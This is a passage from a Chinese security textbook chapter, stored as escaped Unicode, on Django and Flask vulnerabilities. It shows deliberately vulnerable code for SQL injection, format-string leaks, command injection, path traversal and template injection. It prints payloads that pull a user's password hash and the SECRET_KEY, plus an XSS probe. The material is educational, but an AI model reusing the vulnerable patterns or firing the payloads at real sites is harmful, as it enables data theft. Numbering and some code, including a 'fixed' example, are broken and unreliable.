\u5728setting.py\u6587\u4EF6\u4E2D\u8BBE\u7F6E\u4E2D\u95F4\u4EF6django.middleware.csrf.CsrfViewMiddleware\u3002\r
\r
l \u5C40\u90E8\uFF1A\r
\r
@csrf_protect\uFF1A\u4E3A\u5F53\u524D\u51FD\u6570\u5F3A\u5236\u8BBE\u7F6E\u9632\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020\u529F\u80FD\uFF0C\u5373\u4F7Fsettings\u4E2D\u6CA1\u6709\u8BBE\u7F6E\u5168\u5C40\u4E2D\u95F4\u4EF6\u3002\r
\r
@csrf_exempt\uFF1A\u53D6\u6D88\u5F53\u524D\u51FD\u6570\u9632\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020\u529F\u80FD\uFF0C\u5373\u4F7Fsettings\u4E2D\u8BBE\u7F6E\u4E86\u5168\u5C40\u4E2D\u95F4\u4EF6\u3002\r
\r
  \uFF082\uFF09\u5BA2\u6237\u7AEF\u4F20\u7EDF\u8868\u5355\u4E2D\u6DFB\u52A0csrfToken\r
\r
\u5728\u4F7F\u7528Post\u65B9\u6CD5\u63D0\u4EA4\u8868\u5355\u65F6\uFF0C\u53EF\u540C\u65F6\u63D0\u4EA4csrfToken\u81F3\u540E\u53F0\u670D\u52A1\u5668\uFF0C\u7136\u540E\u5224\u65AD\u524D\u53F0\u7684Token\u662F\u5426\u4E0E\u540E\u7AEF\u7684csrfToken\u4E00\u81F4\uFF0C\u4ECE\u800C\u907F\u514DCSRF\u6F0F\u6D1E\u7684\u53D1\u751F\u3002\r
\r
l Django\u5728\u6E32\u67D3\u6A21\u5757\u65F6\uFF0C\u4F7F\u7528 RequestContext\u5904\u7406csrf_token\uFF0C\u4ECE\u800C\u81EA\u52A8\u4E3A\u8868\u5355\u6DFB\u52A0\u4E00\u4E2A\u540D\u4E3Acsrfmiddlewaretoken\u7684\u9690\u85CF\u8F93\u5165\u53C2\u6570\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
return render_to_response('Account/Login.html',data,context_instance=**RequestContext**(request))\u3000\r
\r
\r
\r
l \u4F7F\u7528render\u81EA\u52A8\u751F\u6210csrf_token\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
return **render**(request, 'xxx.html', data)\r
\r
\r
\r
l HTML\u8868\u5355\u4E2D\u8BBE\u7F6EToken\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<FORM action=\u201D.\u201D method=\u201Dpost\u201D>**{% csrf_token%}**\r
\r
\r
\r
  \uFF083\uFF09\u5BA2\u6237\u7AEF\u4E2DAjax\u4F7F\u7528X-CSRFToken\u8BF7\u6C42\u5934\r
\r
\u5728\u8FDB\u884Cpost\u63D0\u4EA4\u65F6\uFF0C\u83B7\u53D6Cookie\u5F53\u4E2D\u7684csrftoken\u5E76\u5728\u8BF7\u6C42\u4E2D\u6DFB\u52A0X-CSRFToken\u8BF7\u6C42\u5934, \u8BE5\u8BF7\u6C42\u5934\u7684\u6570\u636E\u5C31\u662Fcsrftoken\u3002\u901A\u8FC7$.ajaxSetup\u65B9\u6CD5\u8BBE\u7F6Eajax\u8BF7\u6C42\u7684\u9ED8\u8BA4\u53C2\u6570\u9009\u9879\uFF0C\u5728\u6BCF\u6B21ajax\u7684POST\u8BF7\u6C42\u65F6\uFF0C\u6DFB\u52A0X-CSRFToken\u8BF7\u6C42\u5934\u3002\r
\r
\r
\r
<script type="text/javascript">\r
\r
\u200B    **var csrftoken = $.cookie('csrftoken');**\r
\r
\u200B    function csrfSafeMethod(method) {\r
\r
\u200B      return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));\r
\r
\u200B    }\r
\r
\u200B    $.ajaxSetup({\r
\r
\u200B      beforeSend: function(xhr, settings) {\r
\r
\u200B        if (!csrfSafeMethod(settings.type) && !this.crossDomain) {\r
\r
\u200B           **xhr.setRequestHeader("X-CSRFToken", csrftoken);**\r
\r
\u200B        }}\r
\r
\u200B    });\r
\r
\r
\r
### 14.2.4 Django\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\r
\r
Django\u4E2D\u5982\u679C\u4F7F\u7528\u5176API\u53BB\u64CD\u4F5C\u6570\u636E\u5E93\u5219\u4E00\u822C\u4E0D\u4F1A\u51FA\u73B0SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u7684\u4EA7\u751F\u4E3B\u8981\u662F\u7531\u4E8E\u4EE3\u7801\u4E2DSQL\u8BED\u53E5\u76F4\u63A5\u62FC\u63A5\u5BFC\u81F4\u7684\uFF0C\u4E0B\u9762\u7ED9\u51FADjango\u6846\u67B6\u4E2D\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
def getuser(request):\r
\r
  username = request.POST.get("username")\r
\r
  **query = 'select \\* from user where username=%s'%username**\r
\r
  connection = psycopg2.connect(dbname, user, host, password)\r
\r
  curs = connection.cursor()\r
\r
  **curs.execute(query)**\r
\r
  res = curs.fetchall()\r
\r
  connection.close()\r
\r
  return res\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u901A\u8FC7POST\u65B9\u5F0F\u4F20\u9012\u53C2\u6570username\uFF0C\u62FC\u63A5SQL\u8BED\u53E5\u540E\u76F4\u63A5\u6267\u884C\uFF0C\u5BFC\u81F4SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u4FEE\u590D\u540E\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
def getuser(request):\r
\r
  **username** = request.POST.get("username")\r
\r
  **query = 'select \\* from user where username=%s'**\r
\r
  connection = psycopg2.connect(dbname, user, host, password)\r
\r
  curs = connection.cursor()\r
\r
  **curs.execute(query, [username])**\r
\r
  res = curs.fetchall()\r
\r
\r
\r
### 14.2.5 Django\u4E2D\u7684\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\r
\r
\\1. Django\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u4ECB\u7ECD\r
\r
Python\u4E2D\u7684\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\u5305\u542B\u5F88\u591A\u79CD\uFF0C\u5206\u522B\u662F\uFF1A\u767E\u5206\u53F7\u5F62\u5F0F\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u3001FORMat\u51FD\u6570\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u3001python3.6\u4EE5\u4E0A\u4F7F\u7528f\u5173\u952E\u5B57\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u3002\u5BF9\u4E8EDjango\u6846\u67B6\u800C\u8A00\uFF0C\u5176\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\u4E3B\u8981\u51FA\u73B0\u5728FORMat\u51FD\u6570\u4E2D\u3002\u5229\u7528\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\uFF0C\u5176\u53EF\u4EE5\u8FC7\u5F97\u5F88\u591A\u654F\u611F\u4FE1\u606F\uFF0C\u5305\u62EC\uFF1A\u5BF9\u8C61\u5C5E\u6027\u3001\u914D\u7F6E\u6587\u4EF6\u5185\u5BB9\u7B49\u654F\u611F\u4FE1\u606F\u3002\u4E0B\u9762\u7ED9\u51FADjango\u6846\u67B6\u4E2D\u5B58\u5728\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\u7684\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
def view(request, *args, **kwargs):\r
\r
  template = 'Hello {user}, This is your email: ' + request.GET.get('**email**')\r
\r
  return HttpResponse(**template.FORMat(user=request.user)**)\r
\r
\r
\r
\u4E0A\u8FF0Django\u4EE3\u7801\u4E3A\u663E\u793A\u7528\u6237\u4F20\u5165\u7684email\u5730\u5740\uFF0C\u4F7F\u7528GET\u65B9\u5F0F\u4F20\u9012\u7684email\u5C06\u663E\u793A\u81F3\u524D\u53F0\u9875\u9762\uFF0C\u82E5\u8BE5email\u53C2\u6570\u53EF\u901A\u8FC7\u7528\u6237\u63A7\u5236\uFF0C\u4E14\u88AB\u89E3\u6790\u9519\u8BEF\u5C06\u663E\u793A\u654F\u611F\u4FE1\u606F\u3002\u5F53\u8F93\u5165\u7684URL\u4E3Ahttp://localhost:8000/?email={user.password}\u5219\u5C06\u6A21\u677F\u62FC\u63A5\u4E3AHello {user}, This is your email:{user.password}\u663E\u793A\u81F3\u524D\u53F0\u9875\u9762\uFF0C\u5982\u56FE12-11\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image660.jpg)\r
\r
\u56FE14-11 \u5229\u7528\u6F0F\u6D1E\u67E5\u770B\u7528\u6237\u540D\u5BC6\u7801\r
\r
\u8F93\u51FA\u4E86\u5F53\u524D\u5DF2\u767B\u9646\u7528\u6237\u54C8\u5E0C\u8FC7\u7684\u5BC6\u7801\u3002user\u662F\u5F53\u524D\u4E0A\u4E0B\u6587\u4E2D\u4EC5\u6709\u7684\u4E00\u4E2A\u53D8\u91CF\uFF0C\u4E5F\u5C31\u662FFORMat\u51FD\u6570\u4F20\u5165\u7684user=request.user\uFF0CDjango\u4E2Drequest.user\u662F\u5F53\u524D\u7528\u6237\u5BF9\u8C61\uFF0C\u8BE5\u5BF9\u8C61\u5305\u542B\u4E00\u4E2A\u5C5E\u6027password\u5373\u8BE5\u7528\u6237\u5BC6\u7801\u3002\r
\r
\\2. Django\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u5229\u7528\r
\r
\u901A\u8FC7Django\u6846\u67B6\u4E2D\u4E00\u4E9B\u8DEF\u5F84\uFF0C\u6700\u7EC8\u8BFB\u53D6\u5230\u914D\u7F6E\u9879\u3002Django\u81EA\u5E26\u7684\u5E94\u7528\u201Cadmin\u201D\u7684models.py\u4E2D\u5BFC\u5165\u4E86\u5F53\u524D\u7F51\u7AD9\u7684\u914D\u7F6E\u6587\u4EF6\uFF0C\u53EA\u9700\u8981\u901A\u8FC7\u67D0\u79CD\u65B9\u5F0F\uFF0C\u627E\u5230Django\u9ED8\u8BA4\u5E94\u7528admin\u7684model\uFF0C\u518D\u901A\u8FC7\u8FD9\u4E2Amodel\u83B7\u53D6settings\u5BF9\u8C61\uFF0C\u8FDB\u800C\u83B7\u53D6\u6570\u636E\u5E93\u8D26\u53F7\u5BC6\u7801\u3001Web\u52A0\u5BC6\u5BC6\u94A5\u7B49\u4FE1\u606F\uFF0C\u5982\u56FE12-12\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image662.jpg)\r
\r
\u56FE14-12 \u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\u5229\u7528\u6D41\u7A0B\r
\r
\u4E0B\u9762\u7ED9\u51FA\u5229\u7528\u7684Payload\uFF1A\r
\r
\r
\r
http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}\r
\r
\r
\r
  \u5229\u7528\u540E\u83B7\u53D6Django\u4E2D\u7684SECRET_KEY\uFF0C\u5982\u56FE14-13\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image664.jpg)\r
\r
\u56FE14-13 \u6F0F\u6D1E\u5229\u7528\u56FE\r
\r
\\3. Django\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u9632\u5FA1\r
\r
Django\u6846\u67B6\u4E2D\u51FA\u73B0\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\u4E3B\u8981\u662F\u7531\u4E8E\u5176template\u4F7F\u7528\u4E86FORMat\u51FD\u6570\u8FDB\u884C\u62FC\u63A5\uFF0C\u5BFC\u81F4\u654F\u611F\u4FE1\u606F\u88AB\u9519\u8BEF\u663E\u793A\u81F3\u524D\u53F0\u9875\u9762\u3002\u90A3\u6709\u6CA1\u6709\u4E00\u79CD\u65B9\u6CD5\u53EF\u4EE5\u4E0D\u9002\u7528FORMat\u62FC\u63A5template\u5462\uFF1F\u5176\u53EF\u4EE5\u4F7F\u7528render\u51FD\u6570\u5C06value\u503C\u901A\u8FC7Django\u6846\u67B6\u5185\u90E8template\u62FC\u63A5\uFF0C\u4ECE\u800C\u53D7\u5230\u6846\u67B6\u4FDD\u62A4\uFF0C\u62B5\u5FA1\u683C\u5F0F\u5316\u5B57\u7B26\u4E32\u6F0F\u6D1E\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u5B89\u5168\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
def view_right(req):\r
\r
  if req.method == 'GET':\r
\r
\u200B    return render(req, 'FORMat.html')\r
\r
  else:\r
\r
\u200B    template = req.POST.get('email')\r
\r
\u200B    **return render(req, 'FORMat.html' ,("value": template))**\r
\r
\r
\r
### 14.2.6 Django\u4E2D\u7684\u5176\u4ED6\u6F0F\u6D1E\r
\r
  1.\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\r
\r
\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u901A\u5E38\u662F\u8C03\u7528Shell\u6765\u5B9E\u73B0\u4E00\u4E9B\u529F\u80FD\uFF0C\u4E0E\u5BA1\u8BA1\u5176\u4ED6\u8BED\u8A00\u7684\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7C7B\u4F3C\uFF0CDjango\u4E2D\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u540C\u6837\u9700\u8981\u5BF9\u4E00\u4E9B\u5E38\u89C1\u7684\u654F\u611F\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u5176\u5BA1\u8BA1\u7684\u5371\u9669\u51FD\u6570\u5305\u62EC\uFF1A\r
\r
exec()\u3001eval()\u3001os.system()\u3001os.popen()\u3001os.spaw*()\u3001os.exec*()\u3001os.open()\u3001os.popen*()\u3001commands.call()\u3001commands.getoutput()\u3001Popen*()\r
\r
\u4E0B\u9762\u7ED9\u51FA\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u4EE3\u7801\u6848\u4F8B\uFF1A\r
\r
\r
\r
def store_uploaded_file(request):\r
\r
  uploaded_file = request.POST.get(\u201Cfilename\u201D)\r
\r
  upload_dir_path = \u201Cstatic/uploads\u201D\r
\r
  if not os.path.exists(upload_dir_path):\r
\r
\u200B    os.makedirs(upload_dir_path)\r
\r
  **cmd = \u201Cmv\u201D+uploaded_file+\u201C \u201D+\u201C%s\u201D%upload_dir_path**\r
\r
**os.system(cmd)**\r
\r
return \u2018static/upload/%s\u2019%uploaded_file\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u7531\u4E8E\u672A\u5BF9\u53C2\u6570cmd\u8FDB\u884C\u4E25\u683C\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u5176\u53EF\u4EE5\u901A\u8FC7\u4FEE\u6539\u53C2\u6570uploaded_file\u7684\u65B9\u5F0F\u6267\u884C\u547D\u4EE4\u3002\r
\r
2.\u8DEF\u5F84\u7A7F\u8D8A\u6F0F\u6D1E\r
\r
\u8DEF\u5F84\u7A7F\u8D8A\u6F0F\u6D1E\u901A\u5E38\u662F\u7531\u4E8E\u5176\u672A\u5BF9\u8DEF\u5F84\u53C2\u6570\u8FDB\u884C\u4E25\u683C\u7684\u6821\u9A8C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u3001\u5220\u9664\u3001\u5199\u5165\u7B49\u5371\u5BB3\uFF0C\u5E38\u89C1\u7684\u5B58\u5728\u8DEF\u5F84\u7A7F\u8D8A\u7684\u51FD\u6570\u5305\u62EC\uFF1Aopen(user_input)\u3001os.fdopen(user_input)\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u8DEF\u5F84\u7A7F\u8D8A\u6F0F\u6D1E\u7684\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
if os.path.isfile(**path**):\r
\r
  file = **open(path)**\r
\r
  file.write(file.read())\r
\r
  file.close()\r
\r
else:\r
\r
  file.write(\u2018hello world\u2019)\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u672A\u5BF9path\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u5176\u5B58\u5728\u8DEF\u5F84\u7A7F\u8D8A\u6F0F\u6D1E\uFF0C\u4ECE\u800C\u8BFB\u53D6\u4EFB\u610F\u6587\u4EF6\u3002\r
\r
## 14.3 Flask\u6846\u67B6\u5E38\u89C1\u6F0F\u6D1E\r
\r
### 14.3.1 Flask\u6846\u67B6\u4ECB\u7ECD\r
\r
\\1. Flask\u7B80\u4ECB\r
\r
\u76F8\u6BD4\u4E8EDjango\u800C\u8A00\uFF0C\u867D\u7136Flask\u4E0D\u53CADjango\u6846\u67B6\u5E94\u7528\u5E7F\u6CDB\uFF0C\u4F46\u662FFlask\u662F\u6700\u7075\u6D3B\u7684\u6846\u67B6\u4E4B\u4E00\uFF0C\u8FD9\u4E5F\u662FFlask\u53D7\u5230\u5F00\u53D1\u8005\u559C\u7231\u7684\u539F\u56E0\u3002Flask\u662F\u4E00\u4E2A\u8F7B\u91CF\u7EA7\u7684\u53EF\u5B9A\u5236\u6846\u67B6\uFF0C\u4F7F\u7528Python\u8BED\u8A00\u7F16\u5199\uFF0C\u8F83\u5176\u4ED6\u540C\u7C7B\u578B\u6846\u67B6\u66F4\u4E3A\u7075\u6D3B\u3001\u8F7B\u4FBF\u3001\u5B89\u5168\u4E14\u5BB9\u6613\u4E0A\u624B\u3002\u5B83\u53EF\u4EE5\u5F88\u597D\u5730\u7ED3\u5408MVC\u6A21\u5F0F\u8FDB\u884C\u5F00\u53D1\uFF0C\u5F00\u53D1\u4EBA\u5458\u5206\u5DE5\u5408\u4F5C\uFF0C\u5C0F\u578B\u56E2\u961F\u5728\u77ED\u65F6\u95F4\u5185\u5C31\u53EF\u4EE5\u5B8C\u6210\u529F\u80FD\u4E30\u5BCC\u7684\u4E2D\u5C0F\u578B\u7F51\u7AD9\u6216Web\u670D\u52A1\u7684\u5B9E\u73B0\u3002\u53E6\u5916\uFF0CFlask\u8FD8\u6709\u5F88\u5F3A\u7684\u5B9A\u5236\u6027\uFF0C\u7528\u6237\u53EF\u4EE5\u6839\u636E\u81EA\u5DF1\u7684\u9700\u6C42\u6765\u6DFB\u52A0\u76F8\u5E94\u7684\u529F\u80FD\uFF0C\u5728\u4FDD\u6301\u6838\u5FC3\u529F\u80FD\u7B80\u5355\u7684\u540C\u65F6\u5B9E\u73B0\u529F\u80FD\u7684\u4E30\u5BCC\u4E0E\u6269\u5C55\uFF0C\u5176\u5F3A\u5927\u7684\u63D2\u4EF6\u5E93\u53EF\u4EE5\u8BA9\u7528\u6237\u5B9E\u73B0\u4E2A\u6027\u5316\u7684\u7F51\u7AD9\u5B9A\u5236\uFF0C\u5F00\u53D1\u51FA\u529F\u80FD\u5F3A\u5927\u7684\u7F51\u7AD9\u3002\r
\r
\\2. Flask\u9879\u76EE\u76EE\u5F55\r
\r
\u4E00\u4E2AFlask\u9879\u76EE\u4E3B\u8981\u6587\u4EF6\u5305\u62EC\uFF1Astatic\u76EE\u5F55\u3001templates\u76EE\u5F55\u3001\u8DEF\u7531\u6587\u4EF6\u3002\r
\r
l static\u76EE\u5F55\u7528\u6765\u5B58\u653E\u9759\u6001\u8D44\u6E90\uFF0C\u4F8B\u5982\uFF1A\u56FE\u7247\u3001JS\u3001CSS\u6587\u4EF6\u7B49\uFF1B\r
\r
l templates\u76EE\u5F55\u7528\u6765\u5B58\u653E\u6A21\u677F\u6587\u4EF6\uFF1B\r
\r
l \u8DEF\u7531\u6587\u4EF6\u662F\u4E00\u4E2Apython\u6587\u4EF6\uFF0C\u8BE5\u6587\u4EF6\u540D\u79F0\u53EF\u4EE5\u7531\u5F00\u53D1\u8005\u51B3\u5B9A\uFF0C\u4F8B\u5982\uFF1Aserver.py\u3002\r
\r
\\3. Flask\u9879\u76EE\u8FD0\u884C\u6D41\u7A0B\r
\r
\uFF081\uFF09\u8DEF\u7531\r
\r
Flask\u6846\u67B6\u5728\u8FD0\u884C\u65F6\uFF0C\u8981\u7ECF\u8FC7\u8DEF\u7531\u6587\u4EF6\uFF0C\u4E0B\u9762\u7ED9\u51FAindex.py\u8DEF\u7531\u6587\u4EF6\u5185\u5BB9\u3002\r
\r
\r
\r
from flask import Flask,url_for,redirect,render_template,render_template_string,request\r
\r
app = Flask(__name__)\r
\r
**@app.route("/index/")**\r
\r
**def test():**\r
\r
  **return "Hello flask"** \r
\r
if __name__ == "__main__":\r
\r
  app.run()\r
\r
\r
\r
@app.route("/index/") \u4E2D\uFF0Croute\u88C5\u9970\u5668\u7684\u4F5C\u7528\u662F\u5C06\u51FD\u6570\u548Curl\u7ED1\u5B9A\u8D77\u6765\uFF0C\u5F53\u8FD0\u884C\u8BE5\u811A\u672C\u540E\uFF0C\u7528\u6237\u8BBF\u95EEhttp://127.0.0.1:5000/index\u5C31\u4F1A\u8FD4\u56DEHello flask\uFF0C\u8FD9\u5C31\u662F\u7B80\u5355\u7684flask\u6846\u67B6\u8FD0\u884C\u3002\r
\r
\uFF082\uFF09\u6E32\u67D3\r
\r
Flask\u6709\u4E24\u79CD\u6E32\u67D3\u65B9\u5F0F\uFF1Arender_template()\u3001render_template_string()\u3002\r
\r
render_template()\u4E3B\u8981\u7528\u6765\u6E32\u67D3\u6587\u4EF6\uFF0Crender_template_string()\u4E3B\u8981\u7528\u6765\u6E32\u67D3\u5B57\u7B26\u4E32\u3002\u6E32\u67D3\u7684\u6A21\u677F\u4E00\u822C\u662F\u7F51\u7AD9\u6839\u76EE\u5F55templates\u6587\u4EF6\u5939\u4E0B\u7684html\u6587\u4EF6\uFF0C\u5176\u4E2D\u4F20\u5165\u7684\u53C2\u6570\u9700\u8981\u6BCF\u4E2A\u7528\u6237\u6839\u636E\u9700\u6C42\u52A8\u6001\u4F20\u5165\u3002\r
\r
l render_template()\u51FD\u6570\u6848\u4F8B\r
\r
\u5728templates/index.html\u8BBE\u5B9A\u4E24\u4E2A\u52A8\u6001\u4F20\u9012\u7684\u53C2\u6570\uFF0C\u5206\u522B\u662Fuser.name\u548Ctitle\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<html>\r
\r
 <head>\r
\r
  <title>**{{title}}** - \u5C0F\u732A\u4F69\u5947</title>\r
\r
 </head>\r
\r
 <body>\r
\r
   <h1>Hello, **{{user.name}}**!</h1>\r
\r
 </body>\r
\r
</html>\r
\r
\r
\r
\u4E0B\u9762\u7ED9\u51FAapp.py\u6587\u4EF6\u7684\u5185\u5BB9\uFF0C\u5176\u5411\u4E0A\u8FF0\u7684index.html\u4E2D\u6E32\u67D3\u52A8\u6001\u53D8\u91CF\u3002\r
\r
\r
\r
@app.route('/index')#\u6211\u4EEC\u8BBF\u95EE/\u6216\u8005/index\u90FD\u4F1A\u8DF3\u8F6C\r
\r
def index():\r
\r
  **user = {'name': '****\u5C0F\u732A\u4F69\u5947'}**#\u4F20\u5165\u4E00\u4E2A\u5B57\u5178\u6570\u7EC4\r
\r
  return **render_template**("index.html",**title='Home',user=user**)\r
\r
\r
\r
\u8BBF\u95EEhttp://127.0.0.1:5000\u5C31\u4F1A\u81EA\u52A8\u52A0\u8F7Dtemplates/index.html\uFF0C\u5982\u56FE14-14\u6240\u793A\u3002\r
\r
![https://xzfile.aliyuncs.com/media/upload/picture/20181221165143-a425c5c4-04fd-1.png](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image666.gif)\r
\r
\u56FE14-14 render_template\u6848\u4F8B\u9996\u9875\r
\r
l \u5176\u4ED6\u6848\u4F8B\r
\r
\r
\r
@app.route("/index/")\r
\r
def test():\r
\r
  html = "test by gurenmeng"\r
\r
  return **render_template("index.html", content=html)**\r
\r
//templates/index.html\r
\r
<p3>**{{content}}**</p3>\r
\r
\r
\r
\u8BBF\u95EE http://127.0.0.1:5000/index \u5C31\u4F1A\u81EA\u52A8\u52A0\u8F7Dtemplates/index.html\uFF0C\u5C06html\u8FD9\u4E2A\u53C2\u6570\u5185\u5BB9\u4F20\u9012\u7ED9content\u8FD9\u4E2A\u53D8\u91CF\uFF0C\u7136\u540E\u6E32\u67D3\u5230web\u9875\u9762\uFF0C\u9875\u9762\u5C31\u4F1A\u8F93\u51FA test by gurenmeng\uFF0C\u5982\u56FE14-15\u6240\u793A\u3002\r
\r
![https://img-blog.csdnimg.cn/20190121192343552.png](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image668.gif)\r
\r
\u56FE14-15 \u5176\u4ED6\u6848\u4F8B\u9996\u9875\r
\r
### 12.3.2   Flask\u4E2DSSTI\u6F0F\u6D1E\r
\r
1.SSTI\u6F0F\u6D1E\u4ECB\u7ECD\r
\r
SSTI\u6CE8\u5165\u53C8\u79F0\u670D\u52A1\u5668\u7AEF\u6A21\u677F\u6CE8\u5165\u653B\u51FB(Server-Side Template Injection\uFF0CSSTI)\uFF0C\u4E0ESQL\u6CE8\u5165\u4E00\u6837\uFF0C\u5176\u4E5F\u662F\u7531\u4E8E\u63A5\u53D7\u7528\u6237\u8F93\u5165\u800C\u9020\u6210\u7684\u5B89\u5168\u95EE\u9898\u3002\u5B83\u7684\u5B9E\u8D28\u5C31\u662F\u670D\u52A1\u5668\u7AEF\u63A5\u53D7\u4E86\u7528\u6237\u7684\u8F93\u5165\uFF0C\u6CA1\u6709\u7ECF\u8FC7\u8FC7\u6EE4\u6216\u8005\u8BF4\u8FC7\u6EE4\u4E0D\u4E25\u8C28\uFF0C\u5C06\u7528\u6237\u8F93\u5165\u4F5C\u4E3AWeb\u5E94\u7528\u6A21\u677F\u7684\u4E00\u90E8\u5206\uFF0C\u4F46\u662F\u5728\u8FDB\u884C\u7F16\u8BD1\u6E32\u67D3\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u6267\u884C\u4E86\u7528\u6237\u8F93\u5165\u7684\u6076\u610F\u4EE3\u7801\u3001\u4FE1\u606F\u6CC4\u9732\u3001\u4EE3\u7801\u6267\u884C\u3001getshell\u7B49\u95EE\u9898\u3002\r
\r
\u8BE5\u5B89\u5168\u95EE\u9898\u4E3B\u8981\u51FA\u73B0\u5728web\u5E94\u7528\u6A21\u677F\u6E32\u67D3\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u76EE\u524D\u6BD4\u8F83\u6D41\u884C\u7684\u6E32\u67D3\u5F15\u64CE\u6A21\u677F\u4E3B\u8981\u6709\uFF1Asmarty\u3001twig\u3001jinja2\u3001freemarker\u3001velocity\u7B49\uFF0C\u800Cpython\u4E2D\u7684Flask\u4E3B\u8981\u5C31\u662F\u4F7F\u7528\u7684jinja2\u6765\u4F5C\u4E3A\u6E32\u67D3\u6A21\u677F\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\u4E09\u79CD\u8BED\u6CD5\uFF1A\r
\r
l {% %}\uFF1A\u63A7\u5236\u7ED3\u6784\uFF1B\r
\r
l {{ }}\uFF1A\u53D8\u91CF\u53D6\u503C\uFF1B\r
\r
l {# #}\uFF1A\u6CE8\u91CA\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FAFlask\u6846\u67B6\u4E2DSSTI\u6F0F\u6D1E\u6848\u4F8B\u4EE3\u7801\u3002\r
\r
\r
\r
**code** = request.args.get('**ssti**')\r
\r
  html = '''\r
\r
\u200B    <h1>qing -SSIT</h1>\r
\r
\u200B    <h2>The ssti is </h2>\r
\r
\u200B      <h3>**%s**</h3>\r
\r
\u200B    ''' % (**code**)\r
\r
  return render_template_string(html)\r
\r
\r
\r
\u5F00\u53D1\u8005\u5728\u7A0B\u5E8F\u8BBE\u8BA1\u65F6\u4E3A\u4E86\u7701\u4E8B\u5E76\u4E0D\u5199\u4E00\u4E2Ahtml\u6587\u4EF6\uFF0C\u800C\u662F\u76F4\u63A5\u5F53\u5B57\u7B26\u4E32\u6765\u6E32\u67D3\u3002\u5E76\u4E14\u4F20\u9012\u7684\u53C2\u6570ssti\u662F\u53EF\u63A7\u7684\uFF0C\u4ECE\u800C\u5BFC\u81F4\u7528\u6237\u53EF\u76F4\u63A5\u901A\u8FC7URL\u5C06\u53C2\u6570\u6E32\u67D3\u81F3\u524D\u53F0\u9875\u9762\uFF0C\u8FD9\u5C31\u662FFlask\u4E2DSSTI\u6CE8\u5165\u7684\u6210\u56E0\u3002\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4F20\u9012\u53D8\u91CFssti\u5C06\u53D8\u91CF\u52A8\u6001\u8F93\u51FA\u5230%s\u4E0A\uFF0C\u7136\u540E\u7ECF\u8FC7render_template_string\u6E32\u67D3\u81F3\u6A21\u677F\uFF0C\u7531\u4E8E\u5BF9\u7528\u6237\u8F93\u5165\u7684\u503C\u6CA1\u6709\u8FDB\u884C\u4E25\u683C\u7684\u8FC7\u6EE4\uFF0C\u5BFC\u81F4JS\u4EE3\u7801\u88AB\u6CE8\u5165\u5230\u6A21\u677F\u5E76\u6267\u884C\u5F39\u7A97\u3002\r
\r
\u8BBF\u95EEhttp://127.0.0.1:5000/qing?ssti=<script>alert(/qing/)<\/script>\u5C06JS\u4EE3\u7801\u6CE8\u5165\u5230\u6A21\u677F\u4E2D\u6267\u884C\u5F39\u7A97\uFF0C\u5982\u56FE14-16\u6240\u793A\u3002\r
\r
